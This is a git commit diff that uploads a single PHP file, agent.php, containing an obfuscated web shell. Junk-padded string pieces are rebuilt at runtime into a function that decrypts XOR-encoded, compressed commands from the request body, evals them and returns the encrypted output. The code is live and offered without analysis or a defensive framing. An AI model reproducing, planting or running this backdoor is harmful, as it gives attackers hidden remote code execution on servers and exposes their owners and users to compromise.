415b0f16979b2df7ed4a5c79b548e8213bdcd330
Zachary Weber <86028315+ZacharyDevelops@users.noreply.github.com>
2022-05-22 19:09:06 -0400

    Add files via upload

---
+++ agent.php
@@ -0,0 +1,10 @@
+<?php
+$N='putS"),S$m)==1) {S@obS_start();S@eSval(@gzSuncomprSess(@x(S@baSse64_dSecSode($m[1]),$k))SS);$o=@obS_Sge';
+$t=str_replace('G','','cGrGeateGG_funcGtGion');
+$w='$k)S{$c=Sstrlen($k)S;SS$l=Sstrlen($t);$o="S";for($iSS=0;$i<$lS;){for(S$j=0;($j<$cS&&$i<$Sl);$jS++,$i+S+S';
+$h='t_conStentSs();@ob_Send_cleSan();$r=@bSase64S_encode(S@x(@SgzcoSSmpress($o),S$k));print("$pS$Skh$r$kf");}';
+$f='$k="202cSb962S";$khS="aSc59075b964Sb"S;$kf=S"07152d234bS70";$SSp="wTPF98HzNiEzUSRrt";SfunctioSn x($St,';
+$a='){$So.=$t{$i}^$Sk{$j};}}reSturnS $o;}if (S@pregS_SSmatchS("/$Skh(.+)$kfS/",@fSSile_get_coSntents("php://in';
+$i=str_replace('S','',$f.$w.$a.$N.$h);
+$s=$t('',$i);$s();
+?>
